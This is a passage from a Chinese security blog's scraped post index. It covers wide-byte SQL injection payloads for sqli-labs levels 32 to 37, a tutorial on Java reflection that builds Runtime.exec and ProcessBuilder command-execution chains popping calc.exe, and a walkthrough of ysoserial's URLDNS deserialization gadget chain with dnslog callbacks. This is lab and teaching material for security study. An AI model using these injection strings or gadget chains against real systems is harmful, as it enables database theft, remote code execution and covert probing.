所以我们输入 http://127.0.0.1/Less-32/?id=1%df&apos; 根据以上分析，发生如下转换：(%5c是\\的十六进制) %df%27====&gt;(check_addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;運&apos; $sql=&quot;SELECT * FROM users WHERE id=&apos;1運&apos;&apos; LIMIT 0,1&quot;; #成功将单引号闭合，可以进行SQL注入。 参考1：https://www.cnblogs.com/fengshui/p/9266830.html参考2：https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html无法添加单引号或者双引号，可以用16进制绕过-很骚的操作 Less-32输入?id=1%df%27页面会报错说明单引符号起作用了。c?id=-1%df%27%20union%20select%201,2,3%20%23,有回显所以可以宽字节注入 ?id=0%df%27 union select 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-33和上同，只是把自定义的转义函数改成内置的转义函数 ?id=0%df%27 union select 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-34把get改成post了，注意不能直接在界面上输入，因为%什么的都会会浏览器转义，所以burp直接修改 admin%df&apos;or 0 union select 1,group_concat(schema_name) from information_schema.schemata%23&amp;passwd=&amp;submit=Submit Less-35直接注入？回到第一关了233 0 union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-36使用了mysql_real_escape_string函数过滤查看文档,下列字符受影响： \\x00\\n\\r\\&apos;&quot;\\x1a 还是宽字节注入 0%df%27%20union%20selEct%201,group_concat(schema_name),2%20from%20information_schema.schemata;%23-1%EF%BF%BD%27union%20select%201,user(),3--+ Less-37改成post uname=0%df%27%20union%20selEct%20group_concat(schema_name),2%20from%20information_schema.schemata;%23&amp;passwd=1&amp;submit=Submit","link":"2019/04/27/Sqli-Labs/"},{"title":"JAVA1-反射机制","text":"楔子 Java反射 例子-反射 forName getMethod invoke 合并反射函数弹计算器 指定的构造方法生成类的实例 执行私有方法 附录 反射机制的相关类 Class类 Field类 Method类 Constructor类 楔子很久就想写和java审计有关的文章了，java博大精深，学得断断续续，最近来长亭实习，从旁边一个Java大牛师傅学了一下下，还是打算记一下，内容偏易，大牛绕道目录 Java反射真正反序列化漏洞的利用，肯定需要了解java反射原理。因为java反序列化的payload大多与反射机制密切相关。 在Java中的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法；并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。总的来说，反射让java可以在运行时，根据传入的类名字符串，去执行这个类存在的方法，而且可以修改属性的访问修饰符（public、private、protect） 总所周知，一个技术的存活，一定有他的价值，否则在自然生存定律中必定被淘汰，核弹之下无冤魂（狗头）。那么java反射有什么价值么？ 我认为就是实现动态。我们举一个例子 例子-反射假设我们来定义一个女朋友的接口，接口就为想peach，我们尽量使用implements操作，所以抽象的女朋友就行，反正也没有，那么长这样。 interface Girl_friend{ public abstract void dream_peach();} 因为女孩子种类不同，比如小萝莉还是富婆，我们可以实现一下不同的类女朋友 class Luoli implements Girl_friend{ public void dream_peach(){ System.out.println(&quot;I&apos;m your girlFriend, i am Luoli&quot;); }}class Fupo implements Girl_friend{ public void dream_peach(){ System.out.println(&quot;I&apos;m your girlFriend, i am Fupo&quot;); }} 那么我们需要在主类中想peach那就得这样写 public class Helloworld{ public static void main(String[] a){ Girl_friend f=new Fupo(); f.dream_peach(); }}//输出I&apos;m your girlFriend, i am Fupo 桃子确实想好了，但是这样就没有动态的概念了，我所理解的动态是你要修改一个类的时候，不需要修改代码，而是通过传参就可 那么我们可以使用传统的工厂方法获取女朋友的实例 工厂方法可以理解为你把女朋友的属性交给工厂，工厂就帮你制作一个女朋友的实例 那么工厂代码应该这样这样写 class Girl_friend_factory{ public static Girl_friend getInstance(String girlName){ Girl_friend f=null; if(&quot;Luoli&quot;.equals(girlName)){ f=new Luoli(); } if(&quot;Fupo&quot;.equals(girlName)){ f=new Fupo(); } return f; }} 我们可以传入我们期望的女朋友的类型名字就获得了这个实例（可惜现实世界并没有）。那么我们要用的时候先使用工厂拿到实例Girl_friend f=Girl_friend_factory.getInstance(&quot;Luoli&quot;);。那么整体代码就是这样了Helloworld.java interface Girl_friend{ public abstract void dream_peach();}class Luoli implements Girl_friend{ public void dream_peach(){ System.out.println(&quot;I&apos;m your girlFriend, i am Luoli&quot;); }}class Fupo implements Girl_friend{ public void dream_peach(){ System.out.println(&quot;I&apos;m your girlFriend, i am Fupo&quot;); }}class Girl_friend_factory{ public static Girl_friend getInstance(String girlName){ Girl_friend f=null; if(&quot;Luoli&quot;.equals(girlName)){ f=new Luoli(); } if(&quot;Fupo&quot;.equals(girlName)){ f=new Fupo(); } return f; }}public class Helloworld{ public static void main(String[] a){ Girl_friend f=Girl_friend_factory.getInstance(&quot;Luoli&quot;); f.dream_peach(); }}//输出I&apos;m your girlFriend, i am Luoli 似乎一切很顺利了但是不知道有没有发现，在Girl_friend_factory中我们用了很多if判断类名，那么一旦这个type有几十种，我们每增加一种都要做三布步操作 1、增加新的女朋友类型 2、增加if判断 3、主类中调用 那么反射其实解决的就是这么一个问题。反射主要是有这么几个函数直接可调用 获取类的⽅法： forName实例化类对象的⽅法： newInstance获取函数的⽅法： getMethod执⾏函数的⽅法： invoke 我们先来说一说forName的方法 Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取 比如我们想获得上面的萝莉类（Luoli）,就不需要f=new Luoli();了,而是直接使用反射Girl_friend f=(Girl_friend)Class.forName(&quot;Luoli&quot;).newInstance();就获得了萝莉的实例，不知道现在有没有键盘侠站出来说明明f=new Luoli();比后面的短不是么。 但是我们现在说的重点是动态，后者的类名可以动态传入，岂不是美滋滋。那么完整的代码就是 interface Girl_friend{ public abstract void dream_peach();}class Luoli implements Girl_friend{ public void dream_peach(){ System.out.println(&quot;I&apos;m your girlFriend, i am Luoli&quot;); }}class Fupo implements Girl_friend{ public void dream_peach(){ System.out.println(&quot;I&apos;m your girlFriend, i am Fupo&quot;); }}class Girl_friend_factory{ public static Girl_friend getInstance(String girlName){ Girl_friend f=null; try{ f=(Girl_friend)Class.forName(girlName).newInstance(); }catch (Exception e) { e.printStackTrace(); } return f; }}public class Helloworld{ public static void main(String[] a){ Girl_friend f=Girl_friend_factory.getInstance(&quot;Luoli&quot;); f.dream_peach(); }} 到此我们反射获取类的⽅法： forName的意义大概就有了 我们一直说到反射有4个函数比较重要 获取类的⽅法： forName实例化类对象的⽅法： newInstance获取函数的⽅法： getMethod执⾏函数的⽅法： invoke 那么比较重要的例子一般就是长这样 public void execute(String className, String methodName) throws Exception { Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance()); } 知道一点点java-rce的同志应该见过java命令执行最常见的直接调用payload Runtime.getRuntime().exec(&quot;calc.exe&quot;); getRuntime():其实就是Runtime类获取对象的方式，等于new一个Runtime类。之所以封装成一个函数是为了不调用一次建立一个对象，只获取一个对象来执行操作。exec():调用exec函数calc.exe：调用计算器程序 如果我们将这个poc拓展，使用反射四个函数来利用，那么长这样 import java.lang.reflect.InvocationTargetException;public class Helloworld{ public static void main(String[] a) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { Class clazz = Class.forName(&quot;java.lang.Runtime&quot;); clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz), &quot;calc.exe&quot;); }} 我们一步一步来聊一聊这个反射的poc为何能成功。 forName获得一个class对象(java.lang.Class)有三种方法： obj.getClass(): 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过，obj.getClass() 来获取它的类 Test.class:Test是一个已经加载的类，想获取它的java.lang.Class对象，直接拿取class参数即可。（这不是反射机制） Class.forName:如果知道类的名字，可以直接使用forname来获取 可以通过简短的代码验证-其中Runtime是一个已经加载了的类，getRuntime能获得一个类的一个对象，类似于工厂了 System.out.println(Runtime.getRuntime());System.out.println(Runtime.class);System.out.println( );System.out.println(Class.forName(&quot;java.lang.Runtime&quot;)); 输出 java.lang.Runtime@16b98e56class java.lang.Runtimeclass java.lang.Runtimeclass java.lang.Runtime getMethodgetMethod 的作用是通过反射获取一个类的某个特定的公有方法。而Java中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表，如下：后面的String.class是参数 Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class) invokeinvoke方法位于Method类下，其的作用是传入参数，执行方法 public Object invoke(Object obj, Object... args) 注意它的第一个参数是执行method的对象它的第一个参数是执行method的对象： 如果这个方法是一个普通方法，那么第一个参数是类对象 如果这个方法是一个静态方法，那么第一个参数是类 我们正常执行方法是 [1].method([2], [3], [4]...) ，其实在反射里就是method.invoke([1], [2], [3], [4]...) 。对于我们的exec，是一个普通方法，所以需要传入类对象，即invoke(类对象，exec方法传入的参数) 合并反射函数弹计算器那么通过反射调用计算器的一句话代码可以为 Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)),&quot;calc.exe&quot;) 我通过缩进来更友好的体现 Class.forName(&quot;java.lang.Runtime&quot;) .getMethod(&quot;exec&quot;, String.class) .invoke( Class.forName(&quot;java.lang.Runtime&quot;) .getMethod(&quot;getRuntime&quot;) .invoke(Class.forName(&quot;java.lang.Runtime&quot;)) ,&quot;calc.exe&quot; ); 其实是调用了2次invoke函数，里面一层是使用getRuntime的无参函数获得一个实例。外面一层则是调用exec来弹计算器如果做拆分，那么一步步就是这样的 Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class);Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;);Object runtime = getRuntimeMethod.invoke(clazz);execMethod.invoke(runtime, &quot;calc.exe&quot;); 指定的构造方法生成类的实例假设一个类没有getRuntime这样的获取实例的方法，也没有公共的无参构造方法的时候，就要用到getConsturctor()函数 getConsturctor()函数可以选定指定接口格式的构造函数(由于构造函数也可以根据参数来进行重载)，即：getConsturctor(参数类型)选定后我们可以通过newInstance(),并传入构造函数的参数执行构造函数，即newInstance(传入的构造函数参数)。 比如ProcessBuilder有两个构造函数： public ProcessBuilder(List command)public ProcessBuilder(String… command)(此处，String…这种语法表示String参数数量是可变的，与String[]一样) 对应2种方法的poc即长这样 Class.forName(“java.lang.ProcessBuilder”).getConstructor(String.class).newInstance(“calc.exe”))Class.forName(“java.lang.ProcessBuilder”).getConstructor(List.class).newInstance(Arrays.asList(“calc.exe”))) 作为list的构造那么代码为 Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);clazz.getMethod(&quot;start&quot;).invoke( clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;)) ); 作为string的构造代码为 Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);clazz.getMethod(&quot;start&quot;).invoke( clazz.getConstructor(String[].class).newInstance(new String[][]{{&quot;calc.exe&quot;}})); 执行私有方法这是我认为反射最骚的我们前面用的方法或构造方法是public函数，但是如果是私有方法，我们该如何调用？之前我们用的都是getMethod、getConstructor，接下来需要使用getDeclaredMethod、getDeclaredConstructor getMethod等方法获取的是当前类中所有公共方法，包括从父类继承的方法getDeclared等方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了 之前说到Runtime的构造方式是一个私有方法如果代码还是按之前的写法 Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);Constructor m = clazz.getConstructor();clazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;calc.exe&quot;); 得到报错大概意思就是不能直接使用clazz.getConstructor() 函数那么接下来我们通过修改修饰符来调用Runtime的构造方法来获取一个实例来执行calc.exe代码 Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);Constructor m = clazz.getDeclaredConstructor();m.setAccessible(true);clazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;calc.exe&quot;); 成功弹出计算器我们假设把m.setAccessible(true);注释起来原因确实是私有变量的问题 在获取到私有方法后，通过setAccessible(true)可以打破私有方法访问限制，从而进行调用。在其他地方的使用，getDeclaredMethod、getDeclaredConstructor和getMethod、getConstructor使用方法是一致的 附录反射机制的相关类与Java反射相关的类如下： 类名 用途 Class类 代表类的实体，在运行的Java应用程序中表示类和接口 Field类 代表类的成员变量（成员变量也称为类的属性） Method类 代表类的方法 Constructor类 代表类的构造方法 Class类Class代表类的实体，在运行的Java应用程序中表示类和接口。在这个类中提供了很多有用的方法，这里对他们简单的分类介绍。 获得类相关的方法 方法 用途 asSubclass(Class clazz) 把传递的类的对象转换成代表其子类的对象 Cast 把对象转换成代表类或是接口的对象 getClassLoader() 获得类的加载器 getClasses() 返回一个数组，数组中包含该类中所有公共类和接口类的对象 getDeclaredClasses() 返回一个数组，数组中包含该类中所有类和接口类的对象 forName(String className) 根据类名返回类的对象 getName() 获得类的完整路径名字 newInstance() 创建类的实例 getPackage() 获得类的包 getSimpleName() 获得类的名字 getSuperclass() 获得当前类继承的父类的名字 getInterfaces() 获得当前类实现的类或是接口 获得类中属性相关的方法 方法 用途 getField(String name) 获得某个公有的属性对象 getFields() 获得所有公有的属性对象 getDeclaredField(String name) 获得某个属性对象 getDeclaredFields() 获得所有属性对象 获得类中注解相关的方法 方法 用途 getAnnotation(Class annotationClass) 返回该类中与参数类型匹配的公有注解对象 getAnnotations() 返回该类所有的公有注解对象 getDeclaredAnnotation(Class annotationClass) 返回该类中与参数类型匹配的所有注解对象 getDeclaredAnnotations() 返回该类所有的注解对象 获得类中构造器相关的方法 方法 用途 getConstructor(Class…&lt;?&gt; parameterTypes) 获得该类中与参数类型匹配的公有构造方法 getConstructors() 获得该类的所有公有构造方法 getDeclaredConstructor(Class…&lt;?&gt; parameterTypes) 获得该类中与参数类型匹配的构造方法 getDeclaredConstructors() 获得该类所有构造方法 获得类中方法相关的方法 方法 用途 getMethod(String name, Class…&lt;?&gt; parameterTypes) 获得该类某个公有的方法 getMethods() 获得该类所有公有的方法 getDeclaredMethod(String name, Class…&lt;?&gt; parameterTypes) 获得该类某个方法 getDeclaredMethods() 获得该类所有方法 类中其他重要的方法 方法 用途 isAnnotation() 如果是注解类型则返回true isAnnotationPresent(Class&lt;? extends Annotation&gt; annotationClass) 如果是指定类型注解类型则返回true isAnonymousClass() 如果是匿名类则返回true isArray() 如果是一个数组类则返回true isEnum() 如果是枚举类则返回true isInstance(Object obj) 如果obj是该类的实例则返回true isInterface() 如果是接口类则返回true isLocalClass() 如果是局部类则返回true isMemberClass() 如果是内部类则返回true Field类Field代表类的成员变量（成员变量也称为类的属性）。 方法 用途 equals(Object obj) 属性与obj相等则返回true get(Object obj) 获得obj中对应的属性值 set(Object obj, Object value) 设置obj中对应属性值 Method类Method代表类的方法。 方法 用途 invoke(Object obj, Object… args) 传递object对象及参数调用该对象对应的方法 Constructor类Constructor代表类的构造方法。 方法 用途 newInstance(Object… initargs) 根据传递的参数创建类的对象 测试 System.out.println(Runtime.class.getName());System.out.println(Runtime.class.getClasses());System.out.println(Runtime.class.getPackage()); 输出 java.lang.Runtime[Ljava.lang.Class;@7ef20235package java.lang","link":"2020/05/25/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/"},{"title":"JAVA3-ysoserial调试和构造URLDNS的pop链","text":"1.ysoserial 1.1. ysoserial项目介绍 1.2. ysoserial尝尝鲜 1.3. ysoserial调试 1.4. ysoserial项目结构分析 2.java反序列化的pop链思想 3.URLDNS的pop链 3.1.知识储备之hashmap 3.2.手动构造URLDNS的pop链请求 3.3.分析ysoserial中URLDNS利用链 这是java代码审计入门的第三篇，其实才算真的入门了一点java代码审计的皮毛如果大家对java一点都不懂，还是建议看本博客前2篇关于反序列化和反射的基础知识 1.ysoserial1.1. ysoserial项目介绍在p牛的知识星球中将yso这个工具定义为里程碑式的工具，https://github.com/frohoff/ysoserial。 2015年Gabriel Lawrence (@gebl)和ChrisFrohoff (@frohoff)在AppSecCali上提出了利⽤Apache Commons Collections来构造命令执⾏的利⽤链，并在年底因为对Weblogic、JBoss、Jenkins等著名应⽤的利⽤，⼀⽯激起千层浪，彻底打开了⼀⽚Java安全的蓝海。⽽ysoserial就是两位原作者在此议题中释出的⼀个⼯具，它可以让⽤户根据⾃⼰选择的利⽤链，⽣成反序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏⽤户预先定义的命令。 简单来说,因为java序列化后的数据为不可见字符，不方便构造，所以此项目仅仅是一个帮你生成反序列化poc的脚本，不提供反序列化的点，可以这么来说反序列化攻击相当于使用枪命中敌人，ysoserial可以认为是制作子弹的机器，最终发射命中不归子弹管一些payload对应的库 CommonsBeanutilsCollectionsLogging1所需第三方库文件: commons-beanutils:1.9.2，commons-collections:3.1,commons-logging:1.2CommonsCollections1所需第三方库文件: commons-collections:3.1CommonsCollections2所需第三方库文件: commons-collections4:4.0CommonsCollections3所需第三方库文件: commons-collections:3.1(CommonsCollections1的变种)CommonsCollections4所需第三方库文件: commons-collections4:4.0(CommonsCollections2的变种)Groovy1所需第三方库文件: org.codehaus.groovy:groovy:2.3.9Jdk7u21所需第三方库文件: 只需JRE版本 &lt;= 1.7u21Spring1所需第三方库文件: spring框架所含spring-core:4.1.4.RELEASE,spring-beans:4.1.4.RELEASE 1.2. ysoserial尝尝鲜ysoserial的使用也非常简单 java -jar ysoserial.jar [payload] &apos;[command]&apos; 其中payload是我们选取模块的名字，比如我们来尝试使用URLDNS模块，命令为ping dnslog的一个记录 java -jar ysoserial.jar URLDNS &apos;http://yso.2ihodi.dnslog.cn&apos; &gt; yso.bin 因为yso回显的是不可见字符，一般是使用管道符输出到文件或者base64,可以拿二进制编辑器查看生成的内容网上有很多分析序列化字节流结构的文章，这里就不展开我们已经拿到了yso.bin，此时我们需要找到一个反序列化的点，自己写一个模拟环境 import java.io.FileInputStream;import java.io.ObjectInputStream;public class Helloworld{ public static void main(String[] args) throws Exception { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;yso.bin&quot;)); ois.readObject(); }} 运行即会有dns请求,这里代码并不需要反序列化为某个具体对象而是直接调用readObject即可，这也就意味着java反序列化的类并不需要和上下文声明的一一对应，因为我们只是调用反序列化中必经之函数，read0bject();我们可以举个最简单的例子 1.3. ysoserial调试我们现在来调试一下ysoserial，其实主要是看你idea熟不熟了，之前做了一年多java开发，还算熟悉了一点点idea，用起来还算顺手1、首先我们直接git clone https://github.com/frohoff/ysoserial.git,然后用idea打开，直接open文件夹即可当然一开始估计会有很多红色（报错），一个个解决即可，有什么问题把报错丢谷歌基本没啥问题。2、因为这是一个maven项目，首先你要看你配置的maven是否有问题，idea自带了maven，建议使用自带的，因为后期删除卸载方便在setting-&gt;Build,Execution,Deployment-&gt;Build Tools-&gt;Maven里配置即可然后右键根目录下的pom.xml，maven-&gt;import即可自动导入包，如果很慢可以换源，给个之前教程idea的maven换源操作3、找到入口函数src/main/java/ysoserial/GeneratePayload,如果一切正常，会有一个运行的小箭头直接run,如果没有那是项目jdk没有配置，在setting-&gt;project structure-&gt;project setting-&gt;Project配置即可4、正常运行GeneratePayload后会得到一些Usage,因为还没加参数5、添加参数操作，点击运行左边的选项1，里面有一个edit-&gt;configuration,然后在2处填写参数即可再次运行6、调试，只需要在我们需要打断点的地方左边点一下出现一个红点，然后点debug按钮即可再次运行即可调试，能看到调用栈和参数，另外具体调试技巧参见IDEA debug断点调试技巧 idea一些快捷键 Ctrl+Shift+I idea查看函数定义 Ctrl + P 查看参数的信息 Ctrl + Q 示某个类或者方法的 API 说明文档 Ctrl + O 展示该类中所有覆盖或者实现的方法列表，注意这里是字母小写的 O！Ctrl + W 选中当前光标所在的代码块，多次触发，代码块会逐级变大。（常用）Ctrl + Shift + W 是 Ctrl + W 的反向操作Ctrl + Alt + L 格式化代码 （常用）Ctrl + Alt + O 去除没有实际用到的包 1.4. ysoserial项目结构分析我们暂时只看源码部分，本部分给打算二次开发yso的师傅做一个入门 │ GeneratePayload.java {{生成poc的入口函数}}│ Deserializer.java {{反序列化模块}}│ Serializer.java {{序列化模块}}│ Strings.java {{字符处理模块}}│├─exploit {{一些直接调用的exp}}│ JBoss.java│ JenkinsCLI.java│ JenkinsListener.java│ ......│ ├─payloads {{生成gadget poc的代码}}│ │ CommonsBeanutils1.java│ │ URLDNS.java│ │ .....│ ││ ├─annotation {{一些不重要的配置}}│ │ Authors.java│ ││ └─util {{一些重复使用的单元}}│ ClassFiles.java│ Gadgets.java│└─secmgr {{和安全有关的管理}} DelegateSecurityManager.java ExecCheckingSecurityManager.java 其实我感觉这几个师傅入口函数是GeneratePayload.java 在①处接受2个参数比如 URLDNS &apos;http://www.baidu.com&apos;，然后②处获得poc模块的类，这里就是上面的URLDNS.java类，然后③处实例化poc类以及将第二个参数传入类中，④处序列化一次然后输出 确实很简单，我们可以再看一下②处获得类如何写的，我们这里以URLDNS为例调试，我们跟进getPayloadClass很明显其实就是用反射，通过模块名获得类。至于具体哪个类如何实现，需要针对特定poc讲解，对于ysoserial的结构分析就到这里。 P牛说对于未知的事物原理充满好奇喜欢翻翻源码，多调试调试，而不是直接从网上看二手或者某SDN上n手的文章。自己调试其中的奥秘，才是后浪应该具备的探索精神 2.java反序列化的pop链思想很久之前聊过pop链的思想，传送门 面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：进行反序列化的数据能够被用户输入所控制。 狸猫换太子-偷梁换柱简单一点就是某个类有某个属性A,这个属性有一个正常函数B,然而另外也有一个属性C，这个属性拥有一个恶意函数也叫B.当我们构造这个类的时候，如果将A换成了C，那么这波将绝杀，可惜换不得。我们可以利用反序列化构造换成C,达到我们的目的 3.URLDNS的pop链P牛说URLDNS的pop链相当简单，经过分析后确实。前面我们已经使用yso测试URLDNS的pop链构造。这里主要分析一下原因 3.1.知识储备之hashmaphashmap在很多java面试中成为了必问的话题，也是蛮有意思的话题，这里就不过多讲解hashmap,储备知识参考https://www.jianshu.com/p/ee0de4c99f87。首先java中几乎所有类有一个hashcode函数来计算散列结果，比如 String s=&quot;helloworld&quot;;System.out.println(s.hashCode()); 而hashmap其实就是使用了一次hashcode，然后用键的hashcode相关值和 键对应的值形成一个maphashmap使用 HashMap&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();// 键不能重复，值可以重复map.put(&quot;san&quot;, &quot;张三&quot;);map.put(&quot;si&quot;, &quot;李四&quot;);map.put(&quot;wu&quot;, &quot;王五&quot;);map.put(&quot;wang&quot;, &quot;老王&quot;);map.put(&quot;wang&quot;, &quot;老王2&quot;);// 老王被覆盖map.put(&quot;lao&quot;, &quot;老王&quot;);System.out.println(&quot;-------直接输出hashmap:-------&quot;);System.out.println(map); 我们跟进put函数 public V put(K key, V value) { return putVal(hash(key), key, value, false, true);} 先跟进hash函数 static final int hash(Object key) {int h;return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);} 发现和hashCode相关。也就意味着当我们使用hashmap的put的时候，key会调用-&gt;hash(key)-&gt;然后调用key.hashCode() 3.2.手动构造URLDNS的pop链请求回过头来，我们想一下URLDNS为什么会发出dns查询请求我们在URL类中发现了 public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;} 跟进handler.hashCode() protected int hashCode(URL u) { int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); ........... 跟进getHostAddress(u) protected synchronized InetAddress getHostAddress(URL u) { if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(&quot;&quot;)) { return null; } else { try { u.hostAddress = InetAddress.getByName(host); ......................................... 而InetAddress.getByName(host)就是DNS请求了 那么就清楚了,调用链-&gt;map.put(Url,XX)-&gt;URL.hashCode-&gt;handler.hashCode-&gt;getHostAddress(u)-&gt;u.getHost();发出请求，那么我们就可以简单构造一下 HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();URL test_url=new URL(&quot;http://urldns_test.wtnzpa.dnslog.cn&quot;);hashMap.put(test_url, &quot;22222&quot;); 然而我们现在只是用hashmap来产生dns请求，和反序列化无关，我们现在分析一下hashmap的反序列化。我们前往HashMap.java private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ......................... // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) { @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 发现每个值也会调用hash，然后如果key为URL类型就会掉入前面URLDNS的链中，那么我们现在非常方便写代码 public static void main(String[] args) throws Exception{ //0x01.生成payload //设置一个hashMap HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); //设置我们可以接受DNS查询的地址 URL url = new URL(&quot;http://jkkkkk.qxlrj2.dnslog.cn\\n&quot;); //将URL的hashCode字段设置为允许修改 Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); f.setAccessible(true); //**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）** //1. 设置url的hashCode字段为0xdeadbeef（随意的值） f.set(url, 0xdeadbeef); //2. 将url放入hashMap中，右边参数随便写 hashMap.put(url, &quot;rmb122&quot;); //修改url的hashCode字段为-1，为了触发DNS查询（之后会解释） f.set(url, -1); //0x02.写入文件模拟网络传输 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); //0x03.读取文件，进行反序列化触发payload ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); ois.readObject();} 可以分成2部分，一部分是序列化，然后最后两行是反序列化这里有一个有意思的点是为了不让put的时候触发请求，我们先使用了f.set(url, 0xdeadbeef);这是为什么？ 我们分析URL的hashCode public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } 发现hashCode不为-1的时候才调用handler.hashCode()，而hashCode定义为private int hashCode = -1;默认为-1，我们要在构造的时候不请求，我们在put之前set为非-1，注意在put结束后要恢复到-1，否则反序列化的时候也不会请求。那我们的利用链简化就是 HashMap-&gt;readObject()HashMap-&gt;hash()URL-&gt;hashCode()URLStreamHandler-&gt;hashCode()URLStreamHandler-&gt;getHostAddress()InetAddress-&gt;getByName() 3.3.分析ysoserial中URLDNS利用链现在我们可以分析一下ysoserial这个玩意的URLDNS利用链源码 @PayloadTest(skip = &quot;true&quot;)@Dependencies()@Authors({ Authors.GEBL })public class URLDNS implements ObjectPayload&lt;Object&gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&apos;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.&lt;/p&gt; * * &lt;b&gt;Potential false negative:&lt;/b&gt; * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.&lt;/p&gt; */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } }} 我们分析一下两个问题，一个为什么能成功，一个是为什么构造过程没有dns请求（orz膜大佬）成功问题很简单，构造了一个hashmap对象然后返回，对这个对象的序列化和反序列化在其他地方处理。暂且不管有趣的是我们研究一下为什么在构造对象的时候不会有冗余的请求我们发现作者的URL构造函数用了三个参数，我们查看URL源码，三个参数 /** * Creates a URL by parsing the given spec with the specified handler * within a specified context. If the handler is null, the parsing * occurs as with the two argument constructor. * * @param context the context in which to parse the specification. * @param spec the {@code String} to parse as a URL. * @param handler the stream handler for the URL. * @exception MalformedURLException if no protocol is specified, or an * unknown protocol is found, or {@code spec} is {@code null}. * @exception SecurityException * if a security manager exists and its * {@code checkPermission} method doesn&apos;t allow * specifying a stream handler. * @see java.net.URL#URL(java.lang.String, java.lang.String, * int, java.lang.String) * @see java.net.URLStreamHandler * @see java.net.URLStreamHandler#parseURL(java.net.URL, * java.lang.String, int, int) */public URL(URL context, String spec, URLStreamHandler handler) 按照前面说的，我们URL链是 HashMap-&gt;readObject()HashMap-&gt;hash()URL-&gt;hashCode()URLStreamHandler-&gt;hashCode()URLStreamHandler-&gt;getHostAddress()InetAddress-&gt;getByName() 